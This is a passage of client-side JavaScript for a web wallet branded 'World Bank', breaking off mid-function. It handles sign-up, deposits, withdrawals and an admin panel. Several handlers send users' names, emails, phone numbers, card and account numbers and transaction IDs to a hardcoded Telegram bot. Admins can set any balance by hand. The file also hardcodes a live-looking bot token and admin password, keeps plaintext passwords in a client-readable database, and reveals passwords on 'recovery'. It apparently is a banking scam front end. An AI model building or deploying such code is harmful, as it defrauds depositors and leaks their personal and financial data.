const FIREBASE_DB_URL = "https://wallet-banking-default-rtdb.firebaseio.com/";
const BOT_TOKEN = "8898294688:AAH6ngVGDHwNJ1Fpri9OiNgd2nqCDvs9BFE"; 
const CHAT_ID = "7560607133";
const ADMIN_SECURITY_PASS = "worldbank1234@#";

const countryCurrencyMap = {
    "+880": "৳",
    "+65": "$",
    "+60": "MYR",
    "+966": "SAR",
    "+971": "AED",
    "+1": "$",
    "+44": "£",
    "+91": "₹"
};

const mandatoryBangladeshBanks = [
    "🌸 bKash (বিকাশ)",
    "🟧 Nagad (নগদ)",
    "🚀 Rocket (রকেট)",
    "🟡 Upay (উপায়)",
    "🏛️ Dutch Bangla Bank (DBBL)",
    "🏛️ Islami Bank Bangladesh (IBBL)",
    "🏛️ BRAC Bank PLC",
    "🏛️ City Bank PLC",
    "🏛️ Agrani Bank Limited",
    "🏛️ Pubali Bank Limited",
    "🏛️ Sonali Bank Limited",
    "🏛️ Eastern Bank PLC (EBL)",
    "🏛️ IFIC Bank Limited",
    "🏛️ IDLC Finance"
];

const countrySpecificBanksWithLogos = {
    "+880": mandatoryBangladeshBanks,
    "+65": [
        "🔑 POSB Bank (Singapore)",
        "🏛️ DBS Bank (Singapore)",
        "🔴 UOB Bank (Singapore)",
        "📲 PayNow (Singapore)",
        "🏛️ OCBC Bank (Singapore)"
    ],
    "+60": [
        "🟡 Maybank (Malaysia)",
        "🔴 CIMB Bank (Malaysia)",
        "🔵 Public Bank (Malaysia)",
        "🔵 RHB Bank (Malaysia)",
        "📲 Touch 'n Go eWallet"
    ],
    "+966": [
        "🔵 Al Rajhi Bank (Saudi)",
        "🟢 SNB AlAhli (Saudi)",
        "🟡 Riyad Bank (Saudi)",
        "💜 STC Pay (Saudi)"
    ],
    "+971": [
        "🔵 Emirates NBD (UAE)",
        "🔴 First Abu Dhabi Bank (UAE)",
        "📲 e& money (UAE)"
    ],
    "+1": [
        "🔴 Bank of America (USA)",
        "🔵 Chase Bank (USA)",
        "📲 Zelle / Venmo (USA)"
    ]
};

const defaultBalances = {
    WorldBank: 0.00,
    bKash: 0.00,
    Nagad: 0.00,
    Rocket: 0.00
};

let usersDatabase = [];
let bannedEmails = [];
let allTransactions = [];
let activeUser = JSON.parse(localStorage.getItem('wb_active_session')) || null;
let balanceHideTimer = null;
let currentLang = 'en'; 
let tempProfilePhotoBase64 = null;
let cameraStream = null;

function checkLoginInputType(inputEl) {
    const val = inputEl.value.trim();
    const noteEl = document.getElementById('emailWarningNote');
    if (val.includes('@')) {
        noteEl.classList.remove('hidden');
    } else {
        noteEl.classList.add('hidden');
    }
}

async function openQuickPayScanner() {
    document.getElementById('cameraModal').classList.remove('hidden');
    try {
        const video = document.getElementById('qrVideoFeed');
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        video.srcObject = cameraStream;
    } catch (err) {
        showCustomAlert("Camera Error", "Camera permission denied or not supported.");
    }
}

function closeQuickPayScanner() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }
    document.getElementById('cameraModal').classList.add('hidden');
}

function openUSAHotlineFAQ() {
    showCustomAlert("USA Hotline & FAQ", "World Bank 24/7 Global Support Line (USA):\n📞 Toll-Free: +1 (800) 555-0199\n🏛️ HQ Office: +1 (202) 473-1000\n✉️ Email: support@worldbank.org");
}

function filterCountryList() {
    const input = document.getElementById('countrySearchInput').value.toLowerCase();
    const select = document.getElementById('regCountryCode');
    const options = select.options;
    for (let i = 0; i < options.length; i++) {
        const txt = options[i].text.toLowerCase();
        options[i].style.display = txt.includes(input) ? "" : "none";
    }
}

function getUserCurrency(user) {
    if (!user) return '৳';
    if (user.currency) return user.currency;
    if (user.phone) {
        const matched = user.phone.match(/\+\d+/);
        if (matched && countryCurrencyMap[matched[0]]) {
            return countryCurrencyMap[matched[0]];
        }
    }
    return '৳';
}

function formatAmountLocale(amount) {
    const num = parseFloat(amount || 0).toFixed(2);
    if (currentLang === 'bn') {
        const bnDigits = ['০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯'];
        return num.toString().replace(/[0-9]/g, w => bnDigits[w]);
    }
    return num;
}

function showCustomAlert(title, message) {
    document.getElementById('customAlertTitle').innerText = title;
    document.getElementById('customAlertText').innerText = message;
    document.getElementById('customAlertModal').classList.remove('hidden');
}

function closeCustomAlert() {
    document.getElementById('customAlertModal').classList.add('hidden');
}

function sanitizeEmailKey(keyStr) {
    return keyStr ? keyStr.replace(/[^a-zA-Z0-9]/g, "_") : "";
}

async function syncFromFirebase() {
    try {
        const uRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
        const uData = await uRes.json();
        if (uData) {
            usersDatabase = Object.values(uData);
            localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
            
            if (activeUser) {
                const refreshedUser = usersDatabase.find(u => (u.phone === activeUser.phone || u.email === activeUser.email));
                if (refreshedUser) {
                    activeUser = refreshedUser;
                    localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
                }
            }
        } else {
            usersDatabase = [];
        }

        const bRes = await fetch(`${FIREBASE_DB_URL}/bannedEmails.json`);
        const bData = await bRes.json();
        if (bData) {
            bannedEmails = Object.values(bData);
            localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
        }

        const tRes = await fetch(`${FIREBASE_DB_URL}/transactions.json`);
        const tData = await tRes.json();
        if (tData) {
            allTransactions = Object.values(tData).reverse();
            localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        }

    } catch(err) {
        console.error("Firebase sync error:", err);
        usersDatabase = JSON.parse(localStorage.getItem('wb_users')) || [];
        bannedEmails = JSON.parse(localStorage.getItem('wb_banned')) || [];
        allTransactions = JSON.parse(localStorage.getItem('wb_transactions')) || [];
    }
}

document.addEventListener('DOMContentLoaded', async () => {
    await syncFromFirebase();
    
    if (activeUser) {
        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        document.getElementById('userPhoneDisp').innerText = activeUser.phone || activeUser.email;
        document.getElementById('userNameDisp').innerText = activeUser.name || 'User';
        
        updateAvatarDisplay();
        renderBalances();
        populateUserDynamicBanksWithLogos();
    }
});

function openAddMoneyModal() {
    document.getElementById('addMoneyModal').classList.toggle('hidden');
}

function openFundTransferModal() {
    document.getElementById('fundTransferModal').classList.toggle('hidden');
}

function openTopUpModal() {
    document.getElementById('topUpModal').classList.toggle('hidden');
}

function openCardBankModal() {
    document.getElementById('cardBankModal').classList.toggle('hidden');
}

function toggleForgotModal() {
    document.getElementById('forgotModal').classList.toggle('hidden');
}

function populateUserDynamicBanksWithLogos() {
    const addSelect = document.getElementById('addMoneyMethodSelect');
    const transferSelect = document.getElementById('fundTransferMethodSelect');

    if (!addSelect || !transferSelect) return;

    let countryCode = "+880";
    if (activeUser && activeUser.phone) {
        const matched = activeUser.phone.match(/\+\d+/);
        if (matched) countryCode = matched[0];
    }

    const localBanks = countrySpecificBanksWithLogos[countryCode] || [];
    let combinedBanks = Array.from(new Set(["🏛️ World Bank Account", ...localBanks, ...mandatoryBangladeshBanks, "🌐 International Wire Transfer"]));

    addSelect.innerHTML = `<option value="">Select Method or Bank</option>`;
    transferSelect.innerHTML = `<option value="">Select Transfer Method</option>`;

    combinedBanks.forEach(b => {
        addSelect.innerHTML += `<option value="${b}">${b}</option>`;
        transferSelect.innerHTML += `<option value="${b}">${b}</option>`;
    });
}

function updateAvatarDisplay() {
    const avatarEl = document.getElementById('userAvatarDisp');
    if (activeUser && activeUser.photo) {
        avatarEl.style.backgroundImage = `url(${activeUser.photo})`;
        avatarEl.innerText = '';
    } else {
        avatarEl.style.backgroundImage = 'none';
        avatarEl.innerText = '👤';
    }
}

async function refreshAdminData() {
    await syncFromFirebase();
    renderAdminUsersList();
    renderAdminPendingList();
    renderAdminAllHistory();
    populateAdminUserSelect();
    showCustomAlert("Success", 'Database refreshed successfully!');
}

async function saveUserToFirebase(user) {
    const userKey = sanitizeEmailKey(user.phone || user.email);
    try {
        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(user)
        });
    } catch(err) {
        console.error("User save error:", err);
    }
}

async function saveTxToFirebase(txObj) {
    try {
        await fetch(`${FIREBASE_DB_URL}/transactions/tx_${txObj.id}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(txObj)
        });
    } catch(err) {
        console.error("Transaction save error:", err);
    }
}

function togglePasswordVisibility(inputId, btn) {
    const input = document.getElementById(inputId);
    if (!input) return;
    if (input.type === 'password') {
        input.type = 'text';
        btn.innerText = '🙈';
    } else {
        input.type = 'password';
        btn.innerText = '👁️';
    }
}

function handleForgotPassword(e) {
    e.preventDefault();
    const email = document.getElementById('forgotEmailInput').value.trim();
    const phone = document.getElementById('forgotPhoneInput').value.trim();

    const user = usersDatabase.find(u => u.email === email && (u.phone === phone || u.phone.includes(phone)));

    if (user) {
        showCustomAlert("Recovery Success", `Your Password: ${user.password}`);
        toggleForgotModal();
    } else {
        showCustomAlert("Error", 'Provided email or phone was not found!');
    }
}

function handleCountryChange(selectEl) {
    const selectedOption = selectEl.options[selectEl.selectedIndex];
    const nativeLang = selectedOption.getAttribute('data-lang') || 'en';
    setLanguage(nativeLang);
}

function toggleDashboardLanguage() {
    currentLang = currentLang === 'en' ? 'bn' : 'en';
    const dashLangBtn = document.getElementById('dashLangBtn');
    if (dashLangBtn) dashLangBtn.innerText = currentLang.toUpperCase();
    updateModalTexts();
    renderBalances();
}

function setLanguage(lang) {
    currentLang = lang;
    document.getElementById('btnLangEN').classList.toggle('active', lang === 'en');
    document.getElementById('btnLangBN').classList.toggle('active', lang === 'bn');
    
    const dashLangBtn = document.getElementById('dashLangBtn');
    if (dashLangBtn) dashLangBtn.innerText = lang.toUpperCase();

    document.querySelectorAll('[data-' + lang + ']').forEach(el => {
        el.innerText = el.getAttribute('data-' + lang);
    });

    document.querySelectorAll('[data-' + lang + '-ph]').forEach(el => {
        el.placeholder = el.getAttribute('data-' + lang + '-ph');
    });

    updateModalTexts();
    renderBalances();
}

function updateModalTexts() {
    if (currentLang === 'bn') {
        if(document.getElementById('modalTitleAddMoney')) document.getElementById('modalTitleAddMoney').innerText = "📥 Add Money (ডিপোজিট)";
        if(document.getElementById('lblAddMethod')) document.getElementById('lblAddMethod').innerText = "মেথড বা ব্যাংক সিলেক্ট করুন:";
        if(document.getElementById('lblAddAccount')) document.getElementById('lblAddAccount').innerText = "সেন্ডার / একাউন্ট নম্বর:";
        if(document.getElementById('lblAddAmount')) document.getElementById('lblAddAmount').innerText = "টাকার পরিমাণ / Amount:";
        if(document.getElementById('lblAddTrx')) document.getElementById('lblAddTrx').innerText = "ট্রানজেকশন আইডি (TrxID):";
        if(document.getElementById('lblAddPass')) document.getElementById('lblAddPass').innerText = "কনফার্ম করার জন্য আপনার পাসওয়ার্ড দিন:";
        if(document.getElementById('btnSubAdd')) document.getElementById('btnSubAdd').innerText = "কনফার্ম এড মানি";
        if(document.getElementById('btnCanAdd')) document.getElementById('btnCanAdd').innerText = "বাতিল করুন";

        if(document.getElementById('modalTitleTransfer')) document.getElementById('modalTitleTransfer').innerText = "💸 Fund Transfer (উইথড্র)";
        if(document.getElementById('lblTransMethod')) document.getElementById('lblTransMethod').innerText = "কোথায় টাকা ট্রান্সফার করতে চান:";
        if(document.getElementById('lblTransAccount')) document.getElementById('lblTransAccount').innerText = "প্রাপকের ফোন / একাউন্ট নম্বর:";
        if(document.getElementById('lblTransAmount')) document.getElementById('lblTransAmount').innerText = "ট্রান্সফারের পরিমাণ:";
        if(document.getElementById('lblTransTrx')) document.getElementById('lblTransTrx').innerText = "রেফারেন্স / TrxID:";
        if(document.getElementById('lblTransPass')) document.getElementById('lblTransPass').innerText = "কনফার্ম করার জন্য আপনার পাসওয়ার্ড দিন:";
        if(document.getElementById('btnSubTrans')) document.getElementById('btnSubTrans').innerText = "কনফার্ম ফান্ড ট্রান্সফার";
        if(document.getElementById('btnCanTrans')) document.getElementById('btnCanTrans').innerText = "বাতিল করুন";
    } else {
        if(document.getElementById('modalTitleAddMoney')) document.getElementById('modalTitleAddMoney').innerText = "📥 Add Money (Deposit)";
        if(document.getElementById('lblAddMethod')) document.getElementById('lblAddMethod').innerText = "Select Method or Bank:";
        if(document.getElementById('lblAddAccount')) document.getElementById('lblAddAccount').innerText = "Sender / Account Number:";
        if(document.getElementById('lblAddAmount')) document.getElementById('lblAddAmount').innerText = "Amount:";
        if(document.getElementById('lblAddTrx')) document.getElementById('lblAddTrx').innerText = "Transaction ID (TrxID):";
        if(document.getElementById('lblAddPass')) document.getElementById('lblAddPass').innerText = "Enter Password to Confirm:";
        if(document.getElementById('btnSubAdd')) document.getElementById('btnSubAdd').innerText = "Confirm Add Money";
        if(document.getElementById('btnCanAdd')) document.getElementById('btnCanAdd').innerText = "Cancel";

        if(document.getElementById('modalTitleTransfer')) document.getElementById('modalTitleTransfer').innerText = "💸 Fund Transfer (Withdraw)";
        if(document.getElementById('lblTransMethod')) document.getElementById('lblTransMethod').innerText = "Select Destination Bank / Wallet:";
        if(document.getElementById('lblTransAccount')) document.getElementById('lblTransAccount').innerText = "Receiver Account / Mobile:";
        if(document.getElementById('lblTransAmount')) document.getElementById('lblTransAmount').innerText = "Transfer Amount:";
        if(document.getElementById('lblTransTrx')) document.getElementById('lblTransTrx').innerText = "Reference / TrxID:";
        if(document.getElementById('lblTransPass')) document.getElementById('lblTransPass').innerText = "Enter Password to Confirm:";
        if(document.getElementById('btnSubTrans')) document.getElementById('btnSubTrans').innerText = "Confirm Transfer";
        if(document.getElementById('btnCanTrans')) document.getElementById('btnCanTrans').innerText = "Cancel";
    }
}

function switchTab(type) {
    document.getElementById('errorText').style.display = 'none';
    if(type === 'login') {
        document.getElementById('loginForm').classList.remove('hidden');
        document.getElementById('signUpForm').classList.add('hidden');
        document.getElementById('loginTab').classList.add('active');
        document.getElementById('signUpTab').classList.remove('active');
    } else {
        document.getElementById('signUpForm').classList.remove('hidden');
        document.getElementById('loginForm').classList.add('hidden');
        document.getElementById('signUpTab').classList.add('active');
        document.getElementById('loginTab').classList.remove('active');
    }
}

function sendTelegramNotification(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
    }).catch(err => console.error("Telegram API Error:", err));
}

async function handleSignUp(e) {
    e.preventDefault();
    const name = document.getElementById('regName').value;
    const email = document.getElementById('regEmail').value;
    const countryCodeSelect = document.getElementById('regCountryCode');
    const rawPhone = document.getElementById('regPhone').value.trim();
    const password = document.getElementById('regPass').value;

    const fullPhone = countryCodeSelect.value + rawPhone;
    const currency = countryCodeSelect.options[countryCodeSelect.selectedIndex].getAttribute('data-currency') || '৳';

    await syncFromFirebase();

    if (bannedEmails.includes(email) || bannedEmails.includes(fullPhone)) {
        showCustomAlert("Blocked", 'This account is blacklisted.');
        return;
    }

    const exists = usersDatabase.some(u => u.phone === fullPhone || u.email === email);
    if(exists) {
        showCustomAlert("Warning", 'Account already exists with this phone or email!');
        return;
    }

    const newUser = {
        name,
        email,
        phone: fullPhone,
        currency: currency,
        password,
        photo: null,
        totalBalance: 0.00,
        withdrawLimit: 0.00,
        balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await saveUserToFirebase(newUser);

    sendTelegramNotification(`👤 <b>World Bank New Sign Up!</b>\n\n📛 Name: ${name}\n📧 Email: ${email}\n📱 Phone: ${fullPhone}\n💱 Currency: ${currency}`);

    showCustomAlert("Success", 'Account created successfully! Please login with your mobile number.');
    switchTab('login');
    document.getElementById('signUpForm').reset();
}

async function handleLogin(e) {
    e.preventDefault();
    const inputPhone = document.getElementById('logPhone').value.trim();
    const password = document.getElementById('logPass').value;

    if (inputPhone.includes("@")) {
        showCustomAlert("Login Error", 'Login with email is not allowed! Please use your registered mobile number.');
        return;
    }

    await syncFromFirebase();

    if (bannedEmails.includes(inputPhone)) {
        showCustomAlert("Blocked", 'Your account has been blocked!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => (u.phone === inputPhone || u.phone.includes(inputPhone)) && u.password === password);

    if(userIndex !== -1) {
        activeUser = usersDatabase[userIndex];
        if(!activeUser.balances) activeUser.balances = { ...defaultBalances };

        if (!activeUser.currency) {
            activeUser.currency = getUserCurrency(activeUser);
        }

        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));

        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        document.getElementById('userPhoneDisp').innerText = activeUser.phone;
        document.getElementById('userNameDisp').innerText = activeUser.name || 'User';

        updateAvatarDisplay();
        renderBalances();
        populateUserDynamicBanksWithLogos();
    } else {
        document.getElementById('errorText').style.display = 'block';
    }
}

function toggleBalanceVisibility() {
    const pillText = document.getElementById('balancePillText');
    if (!activeUser) return;

    if (balanceHideTimer) clearTimeout(balanceHideTimer);

    const rawBal = activeUser.totalBalance !== undefined ? activeUser.totalBalance : 0.00;
    const showBal = formatAmountLocale(rawBal);
    const curr = getUserCurrency(activeUser);
    
    pillText.innerText = `${curr} ${showBal}`;

    balanceHideTimer = setTimeout(() => {
        pillText.innerText = "Balance";
    }, 3000);
}

function renderBalances() {
    const pillText = document.getElementById('balancePillText');
    const symbolEl = document.getElementById('dashCurrencySymbol');
    const userCurr = getUserCurrency(activeUser);
    
    if (symbolEl && activeUser) symbolEl.innerText = userCurr;
    if (pillText) pillText.innerText = "Balance";
}

function logout() {
    activeUser = null;
    localStorage.removeItem('wb_active_session');
    document.getElementById('dashboardSection').classList.add('hidden');
    document.getElementById('authSection').classList.remove('hidden');
    document.getElementById('loginForm').reset();
}

function previewProfilePhoto(e) {
    const file = e.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(event) {
            tempProfilePhotoBase64 = event.target.result;
            const prev = document.getElementById('profileImagePreview');
            prev.style.backgroundImage = `url(${tempProfilePhotoBase64})`;
            prev.innerText = '';
        };
        reader.readAsDataURL(file);
    }
}

function toggleProfileModal() {
    document.getElementById('profileModal').classList.toggle('hidden');
    if (activeUser) {
        document.getElementById('profNameInput').value = activeUser.name || '';
        document.getElementById('profPhoneInput').value = activeUser.phone || '';
        document.getElementById('profPassInput').value = activeUser.password || '';
        
        const prev = document.getElementById('profileImagePreview');
        if (activeUser.photo) {
            prev.style.backgroundImage = `url(${activeUser.photo})`;
            prev.innerText = '';
        } else {
            prev.style.backgroundImage = 'none';
            prev.innerText = '👤';
        }
    }
}

async function openInboxModal() {
    await syncFromFirebase();
    document.getElementById('inboxModal').classList.toggle('hidden');
    renderUserInboxHistory();
}

async function updateUserProfile(e) {
    e.preventDefault();
    if (!activeUser) return;

    activeUser.name = document.getElementById('profNameInput').value;
    activeUser.password = document.getElementById('profPassInput').value;

    if (tempProfilePhotoBase64) {
        activeUser.photo = tempProfilePhotoBase64;
    }

    const userIndex = usersDatabase.findIndex(u => u.phone === activeUser.phone);
    if (userIndex !== -1) {
        usersDatabase[userIndex] = activeUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        await saveUserToFirebase(activeUser);
    }

    document.getElementById('userNameDisp').innerText = activeUser.name;
    updateAvatarDisplay();

    showCustomAlert("Success", 'Profile updated successfully!');
    toggleProfileModal();
}

async function handleTopUpSubmit(e) {
    e.preventDefault();
    const operator = document.getElementById('topUpOperatorSelect').value;
    const phone = document.getElementById('topUpPhoneInput').value;
    const amount = parseFloat(document.getElementById('topUpAmountInput').value);
    const secPass = document.getElementById('topUpSecPassInput').value;

    if (secPass !== activeUser.password) {
        showCustomAlert("Incorrect Password", 'Please enter your correct security password!');
        return;
    }

    if (!operator || !phone || isNaN(amount) || amount <= 0) {
        showCustomAlert("Error", 'Please provide valid info!');
        return;
    }

    const userCurr = getUserCurrency(activeUser);
    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.phone,
        userName: activeUser.name,
        type: 'TopUp',
        method: operator,
        phone: phone,
        amount: amount,
        currency: userCurr,
        trxId: 'TOPUP_' + Math.floor(100000 + Math.random() * 900000),
        status: 'Pending',
        dateStr: now.toLocaleDateString(),
        timeStr: now.toLocaleTimeString()
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    sendTelegramNotification(`📱 <b>World Bank Top Up!</b>\n\n👤 User: ${activeUser.name}\n📱 Number: ${phone}\n💰 Amount: ${userCurr}${amount}`);

    showCustomAlert("Success Request", 'Your recharge request is pending processing.');
    e.target.reset();
    openTopUpModal();
}

async function handleCardBankSubmit(e) {
    e.preventDefault();
    const type = document.getElementById('cardBankTypeSelect').value;
    const cardAcc = document.getElementById('cardBankAccInput').value;
    const receiverPhone = document.getElementById('cardBankReceiverInput').value;
    const amount = parseFloat(document.getElementById('cardBankAmountInput').value);
    const secPass = document.getElementById('cardBankSecPassInput').value;

    if (secPass !== activeUser.password) {
        showCustomAlert("Incorrect Password", 'Please enter correct security password!');
        return;
    }

    if (!type || !cardAcc || !receiverPhone || isNaN(amount) || amount <= 0) {
        showCustomAlert("Error", 'Please provide valid info!');
        return;
    }

    const userCurr = getUserCurrency(activeUser);
    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.phone,
        userName: activeUser.name,
        type: 'Remittance/Bank',
        method: type,
        phone: `Acc: ${cardAcc} -> ${receiverPhone}`,
        amount: amount,
        currency: userCurr,
        trxId: 'TRX_' + Math.floor(100000 + Math.random() * 900000),
        status: 'Pending',
        dateStr: now.toLocaleDateString(),
        timeStr: now.toLocaleTimeString()
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    sendTelegramNotification(`💳 <b>World Bank Card Transfer!</b>\n\n👤 User: ${activeUser.name}\n💳 Acc: ${cardAcc}\n💰 Amount: ${userCurr}${amount}`);

    showCustomAlert("Success Request", 'Transfer request submitted successfully.');
    e.target.reset();
    openCardBankModal();
}

async function submitTransactionRequest(e, type) {
    e.preventDefault();
    const form = e.target;
    const method = form.querySelector('.methodSelect').value;
    const phone = form.querySelector('.phoneInput').value;
    const amount = parseFloat(form.querySelector('.amountInput').value);
    const trxId = form.querySelector('.trxInput').value;
    const secPass = form.querySelector('.secPassInput').value;

    if (secPass !== activeUser.password) {
        showCustomAlert("Incorrect Password", 'Please enter correct security password!');
        return;
    }

    if (isNaN(amount) || amount <= 0) {
        showCustomAlert("Error", 'Please provide valid amount!');
        return;
    }

    const userLimit = activeUser.withdrawLimit !== undefined ? parseFloat(activeUser.withdrawLimit) : 0.00;
    const userCurr = getUserCurrency(activeUser);

    if (type === 'Withdraw' && userLimit > 0 && amount > userLimit) {
        showCustomAlert("Limit Exceeded", `Withdraw limit is ${userCurr}${formatAmountLocale(userLimit)}.`);
        return;
    }

    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.phone,
        userName: activeUser.name,
        type: type,
        method: method,
        phone: phone,
        amount: amount,
        currency: userCurr,
        trxId: trxId,
        status: 'Pending',
        dateStr: now.toLocaleDateString(),
        timeStr: now.toLocaleTimeString()
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    sendTelegramNotification(`⏳ <b>World Bank ${type} Request!</b>\n\n👤 User: ${activeUser.name}\n🏦 Method: ${method}\n📱 Number: ${phone}\n💰 Amount: ${userCurr}${amount}\n🆔 TrxID: ${trxId}`);

    showCustomAlert("Success Request", `${type} request submitted successfully.`);

    form.reset();
    if(type === 'Deposit') openAddMoneyModal();
    if(type === 'Withdraw') openFundTransferModal();
}

function renderUserInboxHistory() {
    const tbody = document.getElementById('userInboxModalBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    const myTxs = allTransactions.filter(t => t.userEmail === activeUser.phone || t.userEmail === activeUser.email);

    if (myTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#64748b; font-weight:bold;">No records found.</td></tr>`;
        return;
    }

    myTxs.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;

        const curr = t.currency || getUserCurrency(activeUser);
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${t.dateStr || ''} ${t.timeStr || ''}</td>
            <td><b>${t.type}</b></td>
            <td>${t.method}</td>
            <td style="color:#d97706; font-weight:bold;">${curr} ${formatAmountLocale(t.amount)}</td>
            <td><code>${t.trxId}</code></td>
            <td>${statusBadge}</td>
        `;
        tbody.appendChild(tr);
    });
}

async function toggleAdminModal() {
    document.getElementById('adminModal').classList.toggle('hidden');
}

async function verifyAdminPassword() {
    const pass = document.getElementById('adminPassInput').value;
    if (pass === ADMIN_SECURITY_PASS) {
        document.getElementById('adminAuthBox').classList.add('hidden');
        document.getElementById('adminControlBox').classList.remove('hidden');
        
        await syncFromFirebase();
        renderAdminUsersList();
        renderAdminPendingList();
        renderAdminAllHistory();
        populateAdminUserSelect();
    } else {
        showCustomAlert("Error", 'Incorrect Admin Password!');
    }
}

async function adminDeleteUser(userIdentifier) {
    if (!confirm(`Are you sure you want to delete and ban ${userIdentifier}?`)) return;

    usersDatabase = usersDatabase.filter(u => u.phone !== userIdentifier && u.email !== userIdentifier);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));

    try {
        const userKey = sanitizeEmailKey(userIdentifier);
        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, { method: 'DELETE' });
    } catch(err) {
        console.error("User delete firebase error:", err);
    }

    if (!bannedEmails.includes(userIdentifier)) {
        bannedEmails.push(userIdentifier);
        localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
    }

    showCustomAlert("Success", `User deleted & blocked successfully!`);
    renderAdminUsersList();
    populateAdminUserSelect();
}

async function adminUpdateUserWithdrawLimit(e) {
    e.preventDefault();
    const userPhone = document.getElementById('admLimitUserSelect').value;
    const newLimit = parseFloat(document.getElementById('admUserCustomLimitInput').value);

    if (!userPhone || isNaN(newLimit) || newLimit < 0) {
        showCustomAlert("Error", 'Please provide valid info!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => u.phone === userPhone || u.email === userPhone);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        user.withdrawLimit = newLimit;

        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(user);

        const curr = getUserCurrency(user);
        showCustomAlert("Success", `${user.name || 'User'}'s withdraw limit updated to ${curr}${formatAmountLocale(newLimit)}!`);
        
        document.getElementById('admUserCustomLimitInput').value = '';
        renderAdminUsersList();
    }
}

function populateAdminUserSelect() {
    const balSelect = document.getElementById('admBalanceUserSelect');
    const limSelect = document.getElementById('admLimitUserSelect');

    if (balSelect) balSelect.innerHTML = '<option value="">Select User</option>';
    if (limSelect) limSelect.innerHTML = '<option value="">Select User</option>';

    usersDatabase.forEach(u => {
        const identifier = u.phone || u.email;
        const name = u.name || 'Unnamed User';
        const opt1 = document.createElement('option');
        opt1.value = identifier;
        opt1.innerText = `${name} (${identifier})`;
        if (balSelect) balSelect.appendChild(opt1);

        const opt2 = document.createElement('option');
        opt2.value = identifier;
        opt2.innerText = `${name} (${identifier})`;
        if (limSelect) limSelect.appendChild(opt2);
    });
}

async function adminUpdateUserBalance(e) {
    e.preventDefault();
    const userIdentifier = document.getElementById('admBalanceUserSelect').value;
    const method = document.getElementById('admBalanceMethodSelect').value;
    const newAmount = parseFloat(document.getElementById('admBalanceAmount').value);

    if (!userIdentifier || isNaN(newAmount)) {
        showCustomAlert("Error", 'Please provide valid amount!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => u.phone === userIdentifier || u.email === userIdentifier);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        if (!user.balances) user.balances = { ...defaultBalances };

        user.balances[method] = newAmount;

        if (method === 'WorldBank') {
            user.totalBalance = newAmount;
        }

        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(user);

        const curr = getUserCurrency(user);
        showCustomAlert("Success", `${user.name || 'User'}'s ${method} balance updated to ${curr}${formatAmountLocale(newAmount)}!`);
        
        renderAdminUsersList();
        
        if (activeUser && (activeUser.phone === user.phone || activeUser.email === user.email)) {
            activeUser = user;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }
    }
}

function renderAdminUsersList() {
    const tbody = document.getElementById('adminUsersListBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    if (usersDatabase.length === 0) {
        tbody.innerHTML = `<tr><td colspan="8" style="text-align:center; color:#94a3b8;">No users found.</td></tr>`;
        return;
    }

    usersDatabase.forEach(u => {
        const tr = document.createElement('tr');
        const mainBal = u.totalBalance !== undefined ? u.totalBalance : 0.00;
        const limitBal = u.withdrawLimit !== undefined ? u.withdrawLimit : 0.00;
        const curr = getUserCurrency(u);
        const nameVal = u.name || 'N/A';
        const contactVal = u.phone || u.email || 'N/A';
        const passVal = u.password || 'N/A';
        const identifier = u.phone || u.email;
        
